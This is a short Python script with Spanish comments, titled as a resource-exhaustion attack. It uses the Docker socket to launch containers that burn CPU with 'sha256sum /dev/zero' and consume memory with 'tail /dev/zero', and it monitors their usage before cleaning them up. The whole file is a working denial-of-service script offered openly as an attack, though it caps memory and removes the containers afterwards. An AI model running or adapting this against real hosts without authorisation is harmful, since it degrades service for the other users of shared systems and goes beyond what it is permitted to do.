import docker
import time

def resource_exhaustion_attack():
    try:
        client = docker.DockerClient(base_url='unix:///var/run/docker.sock')
        
        # Crear contenedor que consume CPU
        cpu_container = client.containers.run(
            "alpine",
            "sha256sum /dev/zero",  # Consume CPU intensivamente
            detach=True,
            name="cpu_hog"
        )
        
        # Crear contenedor que consume memoria
        mem_container = client.containers.run(
            "alpine",
            "tail /dev/zero",  # Consume memoria
            detach=True,
            name="mem_hog",
            mem_limit="1g"  # Limitar a 1GB para no colapsar el sistema
        )
        
        print("[+] Contenedores de consumo creados")
        
        # Monitorear uso de recursos
        for _ in range(10):  # Monitorear durante 10 ciclos
            cpu_stats = cpu_container.stats(stream=False)
            mem_stats = mem_container.stats(stream=False)
            
            cpu_usage = cpu_stats['cpu_stats']['cpu_usage']['total_usage']
            mem_usage = mem_stats['memory_stats']['usage']
            
            print(f"[+] CPU: {cpu_usage}, Memoria: {mem_usage}")
            
            time.sleep(2)
        
        # Limpiar
        cpu_container.stop()
        cpu_container.remove()
        mem_container.stop()
        mem_container.remove()
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    resource_exhaustion_attack()